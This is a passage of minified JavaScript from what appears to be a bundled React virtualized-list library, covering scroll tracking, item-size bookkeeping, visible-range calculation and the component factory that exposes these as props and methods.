		mt === "end" ? (xt += N + Rt(y.sizeTree, ut)[1] - k + Z, ut === gt && (xt += z)) : mt === "center" ? xt += (N + Rt(y.sizeTree, ut)[1] - k + Z) / 2 : xt -= g, Q !== void 0 && Q !== 0 && (xt += Q);
		const Ft = (pt) => {
			S(), pt ? (O("retrying to scroll to", { location: E }, ft.DEBUG), _(T, E)) : (_(w, !0), O("list did not change, scroll successful", {}, ft.DEBUG));
		};
		if (S(), q === "smooth") {
			let pt = !1;
			a = Y(e, (Kt) => {
				pt = pt || Kt;
			}), h = yt(m, () => {
				Ft(pt);
			});
		} else h = yt(I(e, Wo(150)), Ft);
		return f = setTimeout(() => {
			S();
		}, 1200), _(c, !0), O("scrolling from index to", {
			behavior: q,
			index: ut,
			top: xt
		}, ft.DEBUG), {
			behavior: q,
			top: xt
		};
	})), d), {
		scrollTargetReached: w,
		scrollToIndex: T,
		topListHeight: R
	};
}, ot(Lt, It, Gt), { singleton: !0 });
function Wo(t) {
	return (e) => {
		const n = setTimeout(() => {
			e(!1);
		}, t);
		return (o) => {
			o && (e(!0), clearTimeout(n));
		};
	};
}
function Ue(t, e) {
	t === 0 ? e() : requestAnimationFrame(() => {
		Ue(t - 1, e);
	});
}
function Ke(t, e) {
	const n = e - 1;
	return typeof t == "number" ? t : t.index === "LAST" ? n : t.index;
}
var me = j(([{ defaultItemSize: t, listRefresh: e, sizes: n }, { scrollTop: o }, { scrollTargetReached: r, scrollToIndex: s }, { didMount: i }]) => {
	const l = v(!0), c = v(0), d = v(!0);
	return L(I(i, $(c), W(([m, x]) => x !== 0), Bt(!1)), l), L(I(i, $(c), W(([m, x]) => x !== 0), Bt(!1)), d), Y(I(at(e, i), $(l, n, t, d), W(([[, m], x, { sizeTree: p }, T, w]) => m && (!J(p) || Ae(T)) && !x && !w), $(c)), ([, m]) => {
		yt(r, () => {
			_(d, !0);
		}), Ue(4, () => {
			yt(o, () => {
				_(l, !0);
			}), _(s, m);
		});
	}), {
		initialItemFinalLocationReached: d,
		initialTopMostItemIndex: c,
		scrolledToInitialItem: l
	};
}, ot(Lt, It, fe, At), { singleton: !0 });
function Un(t, e) {
	return Math.abs(t - e) < 1.01;
}
var ue = "up";
var ne = "down";
var Go = "none";
var Ao = {
	atBottom: !1,
	notAtBottomBecause: "NOT_SHOWING_LAST_ITEM",
	state: {
		offsetBottom: 0,
		scrollHeight: 0,
		scrollTop: 0,
		viewportHeight: 0
	}
};
var Mo = 0;
var pe = j(([{ footerHeight: t, headerHeight: e, scrollBy: n, scrollContainerState: o, scrollTop: r, viewportHeight: s }]) => {
	const i = v(!1), l = v(!0), c = U(), d = U(), m = v(4), x = v(Mo), p = ht(I(ze(I(P(r), $t(1), Bt(!0)), I(P(r), $t(1), Bt(!1), dn(100))), et()), !1), T = ht(I(ze(I(n, Bt(!0)), I(n, Bt(!1), dn(200))), et()), !1);
	L(I(at(P(r), P(x)), B(([a, S]) => a <= S), et()), l), L(I(l, zt(50)), d);
	const w = vt(I(at(o, P(s), P(e), P(t), P(m)), Ot((a, [{ scrollHeight: S, scrollTop: E }, y, k, u, g]) => {
		const C = E + y - S > -g, z = {
			scrollHeight: S,
			scrollTop: E,
			viewportHeight: y
		};
		if (C) {
			let V, N;
			return E > a.state.scrollTop ? (V = "SCROLLED_DOWN", N = a.state.scrollTop - E) : (V = "SIZE_DECREASED", N = a.state.scrollTop - E || a.scrollTopDelta), {
				atBottom: !0,
				atBottomBecause: V,
				scrollTopDelta: N,
				state: z
			};
		}
		let O;
		return z.scrollHeight > a.state.scrollHeight ? O = "SIZE_INCREASED" : y < a.state.viewportHeight ? O = "VIEWPORT_HEIGHT_DECREASING" : E < a.state.scrollTop ? O = "SCROLLING_UPWARDS" : O = "NOT_FULLY_SCROLLED_TO_LAST_ITEM_BOTTOM", {
			atBottom: !1,
			notAtBottomBecause: O,
			state: z
		};
	}, Ao), et((a, S) => a !== void 0 && a.atBottom === S.atBottom))), R = ht(I(o, Ot((a, { scrollHeight: S, scrollTop: E, viewportHeight: y }) => {
		if (!Un(a.scrollHeight, S)) {
			const k = S - (E + y) < 1;
			return a.scrollTop !== E && k ? {
				changed: !0,
				jump: a.scrollTop - E,
				scrollHeight: S,
				scrollTop: E
			} : {
				changed: !0,
				jump: 0,
				scrollHeight: S,
				scrollTop: E
			};
		}
		return {
			changed: !1,
			jump: 0,
			scrollHeight: S,
			scrollTop: E
		};
	}, {
		changed: !1,
		jump: 0,
		scrollHeight: 0,
		scrollTop: 0
	}), W((a) => a.changed), B((a) => a.jump)), 0);
	L(I(w, B((a) => a.atBottom)), i), L(I(i, zt(50)), c);
	const h = v(ne);
	L(I(o, B(({ scrollTop: a }) => a), et(), Ot((a, S) => it(T) ? {
		direction: a.direction,
		prevScrollTop: S
	} : {
		direction: S < a.prevScrollTop ? ue : ne,
		prevScrollTop: S
	}, {
		direction: ne,
		prevScrollTop: 0
	}), B((a) => a.direction)), h), L(I(o, zt(50), Bt(Go)), h);
	const f = v(0);
	return L(I(p, W((a) => !a), Bt(0)), f), L(I(r, zt(100), $(p), W(([a, S]) => S), Ot(([a, S], [E]) => [S, E], [0, 0]), B(([a, S]) => S - a)), f), {
		atBottomState: w,
		atBottomStateChange: c,
		atBottomThreshold: m,
		atTopStateChange: d,
		atTopThreshold: x,
		isAtBottom: i,
		isAtTop: l,
		isScrolling: p,
		lastJumpDueToItemResize: R,
		scrollDirection: h,
		scrollVelocity: f
	};
}, ot(It));
var ae = "top";
var de = "bottom";
var hn = "none";
function gn(t, e, n) {
	return typeof t == "number" ? n === ue && e === ae || n === ne && e === de ? t : 0 : n === ue ? e === ae ? t.main : t.reverse : e === de ? t.main : t.reverse;
}
function In(t, e) {
	return typeof t == "number" ? t : t[e] ?? 0;
}
var je = j(([{ deviation: t, fixedHeaderHeight: e, headerHeight: n, scrollTop: o, viewportHeight: r }]) => {
	const s = U(), i = v(0), l = v(0), c = v(0);
	return {
		increaseViewportBy: l,
		listBoundary: s,
		overscan: c,
		topListHeight: i,
		visibleRange: ht(I(at(P(o), P(r), P(n), P(s, le), P(c), P(i), P(e), P(t), P(l)), B(([m, x, p, [T, w], R, h, f, a, S]) => {
			const E = m - a, y = h + f, k = Math.max(p - E, 0);
			let u = hn;
			const g = In(S, ae), C = In(S, de);
			return T -= a, T += p + f, w += p + f, w -= a, T > m + y - g && (u = ue), w < m - k + x + C && (u = ne), u !== hn ? [Math.max(E - p - gn(R, ae, u) - g, 0), E - k - f + x + gn(R, de, u) + C] : null;
		}), W((m) => m !== null), et(le)), [0, 0])
	};
}, ot(It), { singleton: !0 });
function _o(t, e, n) {
	if (be(e)) {
		const o = _n(t, e);
		return [{
			index: Rt(e.groupOffsetTree, o)[0],
			offset: 0,
			size: 0
		}, {
			data: n?.[0],
			index: o,
			offset: 0,
			size: 0
		}];
	}
	return [{
		data: n?.[0],
		index: t,
		offset: 0,
		size: 0
	}];
}
var Be = {
	bottom: 0,
	firstItemIndex: 0,
	items: [],
	offsetBottom: 0,
	offsetTop: 0,
	top: 0,
	topItems: [],
	topListHeight: 0,
	totalCount: 0
};
function Te(t, e, n, o, r, s) {
	const { lastIndex: i, lastOffset: l, lastSize: c } = r;
	let d = 0, m = 0;
	if (t.length > 0) {
		d = t[0].offset;
		const R = t[t.length - 1];
		m = R.offset + R.size;
	}
	const x = n - i, p = l + x * c + (x - 1) * o, T = d, w = p - m;
	return {
		bottom: m,
		firstItemIndex: s,
		items: xn(t, r, s),
		offsetBottom: w,
		offsetTop: d,
		top: T,
		topItems: xn(e, r, s),
		topListHeight: e.reduce((R, h) => h.size + R, 0),
		totalCount: n
	};
}
function Kn(t, e, n, o, r, s) {
	let i = 0;
	if (n.groupIndices.length > 0) for (const m of n.groupIndices) {
		if (m - i >= t) break;
		i++;
	}
	const l = t + i, c = Ke(e, l);
	return Te(Array.from({ length: l }).map((m, x) => ({
		data: s[x + c],
		index: x + c,
		offset: 0,
		size: 0
	})), [], l, r, n, o);
}
function xn(t, e, n) {
	if (t.length === 0) return [];
	if (!be(e)) return t.map((d) => ({
		...d,
		index: d.index + n,
		originalIndex: d.index
	}));
	const o = t[0].index, r = t[t.length - 1].index, s = [], i = Yt(e.groupOffsetTree, o, r);
	let l, c = 0;
	for (const d of t) {
		(!l || l.end < d.index) && (l = i.shift(), c = e.groupIndices.indexOf(l.start));
		let m;
		d.index === l.start ? m = {
			index: c,
			type: "group"
		} : m = {
			groupIndex: c,
			index: d.index - (c + 1) + n
		}, s.push({
			...m,
			data: d.data,
			offset: d.offset,
			originalIndex: d.index,
			size: d.size
		});
	}
	return s;
}
function Sn(t, e) {
	return t === void 0 ? 0 : typeof t == "number" ? t : t[e] ?? 0;
}
var Ut = j(([{ data: t, firstItemIndex: e, gap: n, sizes: o, totalCount: r }, s, { listBoundary: i, topListHeight: l, visibleRange: c }, { initialTopMostItemIndex: d, scrolledToInitialItem: m }, { topListHeight: x }, p, { didMount: T }, { recalcInProgress: w }]) => {
	const R = v([]), h = v(0), f = U(), a = v(0);
	L(s.topItemsIndexes, R);
	const S = ht(I(at(T, w, P(c, le), P(r), P(o), P(d), m, P(R), P(e), P(n), P(a), t), W(([u, g, , C, , , , , , , , z]) => {
		const O = z !== void 0 && z.length !== C;
		return u && !g && !O;
	}), B(([, , [u, g], C, z, O, V, N, Z, F, mt, q]) => {
		const Q = z, { offsetTree: gt, sizeTree: ut } = Q, xt = it(h);
		if (C === 0) return {
			...Be,
			totalCount: C
		};
		if (u === 0 && g === 0) return xt === 0 ? {
			...Be,
			totalCount: C
		} : Kn(xt, O, z, Z, F, q || []);
		if (J(ut)) return xt > 0 ? null : Te(_o(Ke(O, C), Q, q), [], C, F, Q, Z);
		const Ft = [];
		if (N.length > 0) {
			const D = N[0], K = N[N.length - 1];
			let rt = 0;
			for (const tt of Yt(ut, D, K)) {
				const X = tt.value, lt = Math.max(tt.start, D), St = Math.min(tt.end, K);
				for (let ct = lt; ct <= St; ct++) Ft.push({
					data: q?.[ct],
					index: ct,
					offset: rt,
					size: X
				}), rt += X;
			}
		}
		if (!V) return Te([], Ft, C, F, Q, Z);
		const pt = N.length > 0 ? N[N.length - 1] + 1 : 0, Kt = Bo(gt, u, g, pt);
		if (Kt.length === 0) return null;
		const Qt = C - 1, Ht = ye([], (D) => {
			for (const K of Kt) {
				const rt = K.value;
				let tt = rt.offset, X = K.start;
				const lt = rt.size;
				if (rt.offset < u) {
					X += Math.floor((u - rt.offset + F) / (lt + F));
					const ct = X - K.start;
					tt += ct * lt + ct * F;
				}
				X < pt && (tt += (pt - X) * lt, X = pt);
				const St = Math.min(K.end, Qt);
				for (let ct = X; ct <= St && !(tt >= g); ct++) D.push({
					data: q?.[ct],
					index: ct,
					offset: tt,
					size: lt
				}), tt += lt + F;
			}
		}), te = Sn(mt, ae), b = Sn(mt, de);
		if (Ht.length > 0 && (te > 0 || b > 0)) {
			const D = Ht[0], K = Ht[Ht.length - 1];
			if (te > 0 && D.index > pt) {
				const rt = Math.min(te, D.index - pt), tt = [];
				let X = D.offset;
				for (let lt = D.index - 1; lt >= D.index - rt; lt--) {
					const ct = Yt(ut, lt, lt)[0]?.value ?? D.size;
					X -= ct + F, tt.unshift({
						data: q?.[lt],
						index: lt,
						offset: X,
						size: ct
					});
				}
				Ht.unshift(...tt);
			}
			if (b > 0 && K.index < Qt) {
				const rt = Math.min(b, Qt - K.index);
				let tt = K.offset + K.size + F;
				for (let X = K.index + 1; X <= K.index + rt; X++) {
					const St = Yt(ut, X, X)[0]?.value ?? K.size;
					Ht.push({
						data: q?.[X],
						index: X,
						offset: tt,
						size: St
					}), tt += St + F;
				}
			}
		}
		return Te(Ht, Ft, C, F, Q, Z);
	}), W((u) => u !== null), et()), Be);
	L(I(t, W(Ae), B((u) => u?.length)), r), L(I(S, B((u) => u.topListHeight)), x), L(x, l), L(I(S, B((u) => [u.top, u.bottom])), i), L(I(S, B((u) => u.items)), f);
	const E = vt(I(S, W(({ items: u }) => u.length > 0), $(r, t), W(([{ items: u }, g]) => u[u.length - 1].originalIndex === g - 1), B(([, u, g]) => [u - 1, g]), et(le), B(([u]) => u))), y = vt(I(S, zt(200), W(({ items: u, topItems: g }) => u.length > 0 && u[0].originalIndex === g.length), B(({ items: u }) => u[0].index), et()));
	return {
		endReached: E,
		initialItemCount: h,
		itemsRendered: f,
		listState: S,
		minOverscanItemCount: a,
		rangeChanged: vt(I(S, W(({ items: u }) => u.length > 0), B(({ items: u }) => {
			let g = 0, C = u.length - 1;
			for (; u[g].type === "group" && g < C;) g++;
			for (; u[C].type === "group" && C > g;) C--;
			return {
				endIndex: u[C].index,
				startIndex: u[g].index
			};
		}), et(An))),
		startReached: y,
		topItemsIndexes: R,
		...p
	};
}, ot(Lt, Dn, je, me, fe, pe, At, De), { singleton: !0 });
var jn = j(([{ fixedFooterHeight: t, fixedHeaderHeight: e, footerHeight: n, headerHeight: o }, { listState: r }]) => {
	const s = U(), i = ht(I(at(n, t, o, e, r), B(([l, c, d, m, x]) => l + c + d + m + x.offsetBottom + x.bottom)), 0);
	return L(P(i), s), {
		totalListHeight: i,
		totalListHeightChanged: s
	};
}, ot(It, Ut), { singleton: !0 });
var No = j(([{ viewportHeight: t }, { totalListHeight: e }]) => {
	const n = v(!1);
	return {
		alignToBottom: n,
		paddingTopAddition: ht(I(at(n, t, e), W(([r]) => r), B(([, r, s]) => Math.max(0, r - s)), zt(0), et()), 0)
	};
}, ot(It, jn), { singleton: !0 });
var qn = j(() => ({ context: v(null) }));
var Do = ({ itemBottom: t, itemTop: e, locationParams: { align: n, behavior: o, ...r }, viewportBottom: s, viewportTop: i }) => e < i ? {
	...r,
	align: n ?? "start",
	...o !== void 0 ? { behavior: o } : {}
} : t > s ? {
	...r,
	align: n ?? "end",
	...o !== void 0 ? { behavior: o } : {}
} : null;
var Yn = j(([{ gap: t, sizes: e, totalCount: n }, { fixedFooterHeight: o, fixedHeaderHeight: r, headerHeight: s, scrollingInProgress: i, scrollTop: l, viewportHeight: c }, { scrollToIndex: d }]) => {
	const m = U();
	return L(I(m, $(e, c, n, s, r, o, l), $(t), B(([[x, p, T, w, R, h, f, a], S]) => {
		const { calculateViewLocation: E = Do, done: y, ...k } = x, u = Nn(x, p, w - 1), g = ce(u, p.offsetTree, S) + R + h, C = g + Rt(p.sizeTree, u)[1], z = a + h, V = E({
			itemBottom: C,
			itemTop: g,
			locationParams: k,
			viewportBottom: a + T - f,
			viewportTop: z
		});
		return V !== null ? y && yt(I(i, W((N) => !N), $t(it(i) ? 1 : 2)), y) : y?.(), V;
	}), W((x) => x !== null)), d), { scrollIntoView: m };
}, ot(Lt, It, fe, Ut, Gt), { singleton: !0 });
function Tn(t) {
	return t === !1 ? !1 : t === "smooth" ? "smooth" : "auto";
}
var $o = (t, e) => typeof t == "function" ? Tn(t(e)) : e && Tn(t);
var Uo = j(([{ listRefresh: t, totalCount: e, fixedItemSize: n, data: o }, { atBottomState: r, isAtBottom: s }, { scrollToIndex: i }, { scrolledToInitialItem: l }, { didMount: c, propsReady: d }, { log: m }, { scrollingInProgress: x }, { context: p }, { scrollIntoView: T }]) => {
	const w = v(!1), R = U();
	let h = null;
	function f(y) {
		_(i, {
			align: "end",
			behavior: y,
			index: "LAST"
		});
	}
	Y(I(at(I(P(e), $t(1)), c), $(P(w), s, l, x), B(([[y, k], u, g, C, z]) => {
		let O = k && C, V = "auto";
		return O && (V = $o(u, g || z), O = O && V !== !1), {
			followOutputBehavior: V,
			shouldFollow: O,
			totalCount: y
		};
	}), W(({ shouldFollow: y }) => y)), ({ followOutputBehavior: y, totalCount: k }) => {
		h !== null && (h(), h = null), it(n) !== void 0 ? requestAnimationFrame(() => {
			it(m)("following output to ", { totalCount: k }, ft.DEBUG), f(y);
		}) : h = yt(t, () => {
			it(m)("following output to ", { totalCount: k }, ft.DEBUG), f(y), h = null;
		});
	});
	function a(y) {
		const k = yt(r, (u) => {
			y && !u.atBottom && u.notAtBottomBecause === "SIZE_INCREASED" && h === null && (it(m)("scrolling to bottom due to increased size", {}, ft.DEBUG), f("auto"));
		});
		setTimeout(k, 100);
	}
	Y(I(at(P(w), e, d), W(([y, , k]) => y !== !1 && k), Ot(({ value: y }, [, k]) => ({
		refreshed: y === k,
		value: k
	}), {
		refreshed: !1,
		value: 0
	}), W(({ refreshed: y }) => y), $(w, e)), ([, y]) => {
		it(l) && a(y !== !1);
	}), Y(R, () => {
		a(it(w) !== !1);
	}), Y(at(P(w), r), ([y, k]) => {
		y !== !1 && !k.atBottom && k.notAtBottomBecause === "VIEWPORT_HEIGHT_DECREASING" && f("auto");
	});
	const S = v(null), E = U();
	return L(ze(I(P(o), B((y) => y?.length ?? 0)), I(P(e))), E), Y(I(at(I(E, $t(1)), c), $(P(S), l, x, p), B(([[y, k], u, g, C, z]) => k && g && u?.({
		context: z,
		totalCount: y,
		scrollingInProgress: C
	})), W((y) => !!y), zt(0)), (y) => {
		h !== null && (h(), h = null), it(n) !== void 0 ? requestAnimationFrame(() => {
			it(m)("scrolling into view", {}), _(T, y);
		}) : h = yt(t, () => {
			it(m)("scrolling into view", {}), _(T, y), h = null;
		});
	}), {
		autoscrollToBottom: R,
		followOutput: w,
		scrollIntoViewOnChange: S
	};
}, ot(Lt, pe, fe, me, At, Gt, It, qn, Yn));
var Ko = j(([{ data: t, firstItemIndex: e, gap: n, sizes: o }, { initialTopMostItemIndex: r }, { initialItemCount: s, listState: i }, { didMount: l }]) => (L(I(l, $(s), W(([, c]) => c !== 0), $(r, o, e, n, t), B(([[, c], d, m, x, p, T = []]) => Kn(c, d, m, x, p, T))), i), {}), ot(Lt, me, Ut, At), { singleton: !0 });
var jo = j(([{ didMount: t }, { scrollTo: e }, { listState: n }]) => {
	const o = v(0);
	return Y(I(t, $(o), W(([, r]) => r !== 0), B(([, r]) => ({ top: r }))), (r) => {
		yt(I(n, $t(1), W((s) => s.items.length > 1)), () => {
			requestAnimationFrame(() => {
				_(e, r);
			});
		});
	}), { initialScrollTop: o };
}, ot(At, It, Ut), { singleton: !0 });
var Zn = j(([{ scrollVelocity: t }]) => {
	const e = v(!1), n = U(), o = v(!1);
	return L(I(t, $(o, e, n), W(([r, s]) => s !== !1 && s !== void 0), B(([r, s, i, l]) => {
		const { enter: c, exit: d } = s;
		if (i) {
			if (d(r, l)) return !1;
		} else if (c(r, l)) return !0;
		return i;
	}), et()), e), Y(I(at(e, t, n), $(o)), ([[r, s, i], l]) => {
		r && l !== !1 && l !== void 0 && l.change && l.change(s, i);
	}), {
		isSeeking: e,
		scrollSeekConfiguration: o,
		scrollSeekRangeChanged: n,
		scrollVelocity: t
	};
}, ot(pe), { singleton: !0 });
var qe = j(([{ scrollContainerState: t, scrollTo: e }]) => {
	const n = U(), o = U(), r = U(), s = v(!1), i = v(void 0);
	return L(I(at(n, o), B(([{ scrollHeight: l, scrollTop: c, viewportHeight: d }, { offsetTop: m }]) => ({
		scrollHeight: l,
		scrollTop: Math.max(0, c - m),
		viewportHeight: d
	}))), t), L(I(e, $(o), B(([l, { offsetTop: c }]) => ({
		...l,
		top: l.top + c
	}))), r), {
		customScrollParent: i,
		useWindowScroll: s,
		windowScrollContainerState: n,
		windowScrollTo: r,
		windowViewportRect: o
	};
}, ot(It));
var qo = j(([{ sizeRanges: t, sizes: e }, { headerHeight: n, scrollTop: o }, { initialTopMostItemIndex: r }, { didMount: s }, { useWindowScroll: i, windowScrollContainerState: l, windowViewportRect: c }]) => {
	const d = U(), m = v(void 0), x = v(null), p = v(null);
	return L(l, x), L(c, p), Y(I(d, $(e, o, i, x, p, n)), ([T, w, R, h, f, a, S]) => {
		const E = ko(w.sizeTree);
		h && f !== null && a !== null && (R = f.scrollTop - a.offsetTop), R -= S, T({
			ranges: E,
			scrollTop: R
		});
	}), L(I(m, W(Ae), B(Yo)), r), L(I(s, $(m), W(([, T]) => T !== void 0), et(), B(([, T]) => T.ranges)), t), {
		getState: d,
		restoreStateFrom: m
	};
}, ot(Lt, It, me, At, qe));
function Yo(t) {
	return {
		align: "start",
		index: 0,
		offset: t.scrollTop
	};
}
var Zo = j(([{ topItemsIndexes: t }]) => {
	const e = v(0);
	return L(I(e, W((n) => n >= 0), B((n) => Array.from({ length: n }).map((o, r) => r))), t), { topItemCount: e };
}, ot(Ut));
function Xn(t) {
	let e = !1, n;
	return (() => (e || (e = !0, n = t()), n));
}
var Xo = Xn(() => /iP(ad|od|hone)/i.test(navigator.userAgent) && /WebKit/i.test(navigator.userAgent));
var Jn = j(([{ data: t, defaultItemSize: e, firstItemIndex: n, fixedItemSize: o, fixedGroupSize: r, gap: s, groupIndices: i, heightEstimates: l, itemSize: c, sizeRanges: d, sizes: m, statefulTotalCount: x, totalCount: p, trackItemSizes: T }, { initialItemFinalLocationReached: w, initialTopMostItemIndex: R, scrolledToInitialItem: h }, f, a, S, E, { scrollToIndex: y }, k, { topItemCount: u }, { groupCounts: g }, C]) => {
	const { listState: z, minOverscanItemCount: O, topItemsIndexes: V, rangeChanged: N, ...Z } = E;
	return L(N, C.scrollSeekRangeChanged), L(I(C.windowViewportRect, B((F) => F.visibleHeight)), f.viewportHeight), {
		data: t,
		defaultItemHeight: e,
		firstItemIndex: n,
		fixedItemHeight: o,
		fixedGroupHeight: r,
		gap: s,
		groupCounts: g,
		heightEstimates: l,
		initialItemFinalLocationReached: w,
		initialTopMostItemIndex: R,
		scrolledToInitialItem: h,
		sizeRanges: d,
		topItemCount: u,
		topItemsIndexes: V,
		totalCount: p,
		...S,
		groupIndices: i,
		itemSize: c,
		listState: z,
		minOverscanItemCount: O,
		scrollToIndex: y,
		statefulTotalCount: x,
		trackItemSizes: T,
		rangeChanged: N,
		...Z,
		...C,
		...f,
		sizes: m,
		...a
	};
}, ot(Lt, me, It, qo, Uo, Ut, fe, j(([{ deviation: t, scrollBy: e, scrollingInProgress: n, scrollTop: o }, { isAtBottom: r, isScrolling: s, lastJumpDueToItemResize: i, scrollDirection: l }, { listState: c }, { beforeUnshiftWith: d, gap: m, shiftWithOffset: x, sizes: p }, { log: T }, { recalcInProgress: w }]) => {
	const R = vt(I(c, $(i), Ot(([, f, a, S], [{ bottom: E, items: y, offsetBottom: k, totalCount: u }, g]) => {
		const C = E + k;
		let z = 0;
		return a === u && f.length > 0 && y.length > 0 && (y[0].originalIndex === 0 && f[0].originalIndex === 0 || (z = C - S, z !== 0 && (z += g))), [
			z,
			y,
			u,
			C
		];
	}, [
		0,
		[],
		0,
		0
	]), W(([f]) => f !== 0), $(o, l, n, r, T, w), W(([, f, a, S, , , E]) => !E && !S && f !== 0 && a === ue), B(([[f], , , , , a]) => (a("Upward scrolling compensation", { amount: f }, ft.DEBUG), f))));
	function h(f) {
		f > 0 ? (_(e, {
			behavior: "auto",
			top: -f
		}), _(t, 0)) : (_(t, 0), _(e, {
			behavior: "auto",
			top: -f
		}));
	}
	return Y(I(R, $(t, s)), ([f, a, S]) => {
		S && Xo() ? _(t, a - f) : h(-f);
	}), Y(I(at(ht(s, !1), t, w), W(([f, a, S]) => !f && !S && a !== 0), B(([f, a]) => a), zt(1)), h), L(I(x, B((f) => ({ top: -f }))), e), Y(I(d, $(p, m), B(([f, { groupIndices: a, lastSize: S, sizeTree: E }, y]) => {
		function k(O) {
			return O * (S + y);
		}
		if (a.length === 0) return k(f);
		let u = 0;
		const g = ie(E, 0);
		let C = 0, z = 0;
		for (; C < f;) {
			C++, u += g;
			let O = a.length === z + 1 ? 1 / 0 : a[z + 1] - a[z] - 1;
			C + O > f && (u -= g, O = f - C + 1), C += O, u += k(O), z++;
		}
		return u;
	})), (f) => {
		_(t, f), requestAnimationFrame(() => {
			_(e, { top: f }), requestAnimationFrame(() => {
				_(t, 0), _(w, !1);
			});
		});
	}), { deviation: t };
}, ot(It, pe, Ut, Lt, Gt, De)), Zo, Dn, j(([t, e, n, o, r, s, i, l, c, d, m]) => ({
	...t,
	...e,
	...n,
	...o,
	...r,
	...s,
	...i,
	...l,
	...c,
	...d,
	...m
}), ot(je, Ko, At, Zn, jn, jo, No, qe, Yn, Gt, qn))));
function tr(t, e) {
	const n = {}, o = {};
	let r = 0;
	const s = t.length;
	for (; r < s;) o[t[r]] = 1, r += 1;
	for (const i in e) Object.hasOwn(o, i) || (n[i] = e[i]);
	return n;
}
var Ie = typeof document < "u" ? H.useLayoutEffect : H.useEffect;
function Ye(t, e, n) {
	const o = Object.keys(e.required || {}), r = Object.keys(e.optional || {}), s = Object.keys(e.methods || {}), i = Object.keys(e.events || {}), l = H.createContext({});
	function c(f, a) {
		f.propsReady !== void 0 && _(f.propsReady, !1);
		for (const S of o) {
			const E = f[e.required[S]];
			_(E, a[S]);
		}
		for (const S of r) if (S in a) {
			const E = f[e.optional[S]];
			_(E, a[S]);
		}
		f.propsReady !== void 0 && _(f.propsReady, !0);
	}
	function d(f) {
		return s.reduce((a, S) => (a[S] = (E) => {
			const y = f[e.methods[S]];
			_(y, E);
		}, a), {});
	}
	function m(f) {
		return i.reduce((a, S) => (a[S] = Io(f[e.events[S]]), a), {});
	}
	const x = H.forwardRef(function(a, S) {
		const { children: E, ...y } = a, [k] = H.useState(() => ye(So(t), (C) => {
			c(C, y);
		})), [u] = H.useState(an(m, k));
		Ie(() => {
			for (const C of i) C in y && Y(u[C], y[C]);
			return () => {
				Object.values(u).map(Me);
			};
		}, [
			y,
			u,
			k
		]), Ie(() => {
			c(k, y);
		}), H.useImperativeHandle(S, un(d(k)));
		const g = n;
		return /* @__PURE__ */ jsx(l.Provider, {
			value: k,
			children: n !== void 0 ? /* @__PURE__ */ jsx(g, {
				...tr([
					...o,
					...r,
					...i
				], y),
				children: E
			}) : E
		});
	}), p = (f) => {
		const a = H.useContext(l);
		return H.useCallback((S) => {
			_(a[f], S);
		}, [a, f]);
	}, T = (f) => {
		const S = H.useContext(l)[f], E = H.useCallback((y) => Y(S, y), [S]);
		return H.useSyncExternalStore(E, () => it(S), () => it(S));
	}, w = (f) => {
		const S = H.useContext(l)[f], [E, y] = H.useState(an(it, S));
		return Ie(() => Y(S, (k) => {
			k !== E && y(un(k));
		}), [S, E]), E;
	};
	return {
		Component: x,
		useEmitter: (f, a) => {
			const E = H.useContext(l)[f];
			Ie(() => Y(E, a), [a, E]);
		},
		useEmitterValue: H.version.startsWith("18") ? T : w,
		usePublisher: p
	};
}
var Re = H.createContext(void 0);
var Qn = H.createContext(void 0);
var Oe = "-webkit-sticky";
var vn = "sticky";
var Ze = Xn(() => {
	if (typeof document > "u") return vn;
	const t = document.createElement("div");
	return t.style.position = Oe, t.style.position === Oe ? Oe : vn;
});
var to = typeof document < "u" ? H.useLayoutEffect : H.useEffect;
function ke(t) {
	return "self" in t;
}
function er(t) {
	return "body" in t;
}
function eo(t, e, n, o = Xt, r, s) {
	const i = H.useRef(null), l = H.useRef(null), c = H.useRef(null), d = H.useCallback((p) => {
		let T, w, R;
		const h = p.target;
		if (er(h) || ke(h)) {
			const a = ke(h) ? h : h.defaultView;
			R = s === !0 ? a.scrollX : a.scrollY, T = s === !0 ? a.document.documentElement.scrollWidth : a.document.documentElement.scrollHeight, w = s === !0 ? a.innerWidth : a.innerHeight;
		} else R = s === !0 ? h.scrollLeft : h.scrollTop, T = s === !0 ? h.scrollWidth : h.scrollHeight, w = s === !0 ? h.offsetWidth : h.offsetHeight;
		const f = () => {
			t({
				scrollHeight: T,
				scrollTop: Math.max(R, 0),
				viewportHeight: w
			});
		};
		p.suppressFlushSync === !0 ? f() : ao.flushSync(f), l.current !== null && (R === l.current || R <= 0 || R === T - w) && (l.current = null, e(!0), c.current && (clearTimeout(c.current), c.current = null));
	}, [
		t,
		e,
		s
	]);
	H.useEffect(() => {
		const p = r || i.current;
		return o(r || i.current), d({
			suppressFlushSync: !0,
			target: p
		}), p.addEventListener("scroll", d, { passive: !0 }), () => {
			o(null), p.removeEventListener("scroll", d);
		};
	}, [
		i,
		d,
		n,
		o,
		r
	]);
	function m(p) {
		const T = i.current;
		if (!T || (s === !0 ? "offsetWidth" in T && T.offsetWidth === 0 : "offsetHeight" in T && T.offsetHeight === 0)) return;
		const w = p.behavior === "smooth";
		let R, h, f;
		ke(T) ? (h = Math.max(Et(T.document.documentElement, s === !0 ? "width" : "height"), s === !0 ? T.document.documentElement.scrollWidth : T.document.documentElement.scrollHeight), R = s === !0 ? T.innerWidth : T.innerHeight, f = s === !0 ? window.scrollX : window.scrollY) : (h = T[s === !0 ? "scrollWidth" : "scrollHeight"], R = Et(T, s === !0 ? "width" : "height"), f = T[s === !0 ? "scrollLeft" : "scrollTop"]);
		const a = h - R;
		if (p.top = Math.ceil(Math.max(Math.min(a, p.top), 0)), Un(R, h) || p.top === f) {
			t({
				scrollHeight: h,
				scrollTop: f,
				viewportHeight: R
			}), w && e(!0);
			return;
		}
		w ? (l.current = p.top, c.current && clearTimeout(c.current), c.current = setTimeout(() => {
			c.current = null, l.current = null, e(!0);
		}, 1e3)) : l.current = null, s === !0 && (p = {
			...p.behavior !== void 0 ? { behavior: p.behavior } : {},
			left: p.top
		}), T.scrollTo(p);
	}
	function x(p) {
		s === !0 && (p = {
			...p.behavior !== void 0 ? { behavior: p.behavior } : {},
			...p.top !== void 0 ? { left: p.top } : {}
		}), i.current.scrollBy(p);
	}
	return {
		scrollByCallback: x,
		scrollerRef: i,
		scrollToCallback: m
	};
}
function Xe(t) {
	return t;
}
var or = /* @__PURE__ */ j(([t, e]) => ({
	...t,
	...e
}), ot(Jn, /* @__PURE__ */ j(() => {
	const t = v((l) => `Item ${l}`), e = v((l) => `Group ${l}`), n = v({}), o = v(Xe), r = v("div"), s = v(Xt), i = (l, c = null) => ht(I(n, B((d) => d[l]), et()), c);
	return {
		components: n,
		computeItemKey: o,
